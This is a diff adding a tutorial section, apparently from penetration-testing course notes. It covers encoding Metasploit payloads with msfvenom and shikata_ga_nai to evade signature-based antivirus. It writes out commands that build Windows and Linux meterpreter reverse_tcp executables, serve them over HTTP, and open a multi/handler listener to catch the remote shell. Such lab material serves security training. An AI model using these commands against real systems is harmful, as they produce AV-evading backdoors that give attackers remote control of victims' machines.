@@ -130,8 +130,98 @@
  
 ## Encoding Payloads with Msfvenom
 
-- Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection.
-- Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.
-- We can evade older signature based AV soulutions by encoding our payloads.
-- Encoding is the process of modifying the payload shellcode with the objective of medifying the payload signature.
+- **AV Detection**: Since this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be aware of antivirus (AV) detection.
+- **Signature-Based Detection**: Most end-user AV solutions utilize signature-based detection to identify malicious files or executables.
+- **Evading AV Solutions**: We can evade older signature-based AV solutions by encoding our payloads.
+- **Encoding**: Encoding is the process of modifying the payload shellcode with the objective of altering the payload's signature to evade detection.
+
+## Shellcode
+
+- **Definition**: Shellcode is a piece of code typically used as a payload for exploitation.
+- **Origin of the Term**: It derives its name from "command shell," where shellcode is a piece of code that provides an attacker with a remote command shell on the target system.
+
+## Demo: Encoding Payloads with Msfvenom
+
+### Encoding Windows Payload
+
+1. **List available encoders:**
+
+    ```bash
+    msfvenom --list encoders
+    ```
+
+2. **Generate and encode a Windows x86 payload with Shikata:**
+
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
+    ```
+
+    Navigate to the directory:
+
+    ```bash
+    cd Windows_Payloads/
+    ```
+
+3. **Increase iterations to improve AV evasion:**
+
+    ```bash
+    rm encodedx86.exe
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
+    ```
+
+    Verify the generated file:
+
+    ```bash
+    ls
+    ```
+
+### Encoding Linux Payload
+
+1. **Generate and encode a Linux x86 payload:**
+
+    ```bash
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Linux_Payloads/encodedx86
+    ```
+
+    Navigate to the root directory and list files:
+
+    ```bash
+    cd
+    ls
+    cd Linux_Payloads/
+    ```
+
+### Testing Out the Exploits
+
+1. **Navigate to the Windows payloads directory:**
+
+    ```bash
+    cd Windows_Payloads/
+    ```
+
+2. **Host a simple web server to upload the exploit files:**
+
+    ```bash
+    sudo python -m SimpleHTTPServer 80
+    ```
+
+3. **Set up the Listener in a new tab:**
+
+    ```bash
+    msfconsole
+    ```
+
+    Configure the handler:
+
+    ```bash
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST=[yourIP]
+    set LPORT=1234
+    show options
+    run
+    ```
+
+4. **Execute the payload on the target system**:
+   - On the Windows system, after uploading the payload, executing it on the target will allow us to obtain a Meterpreter session on our Kali system.
 
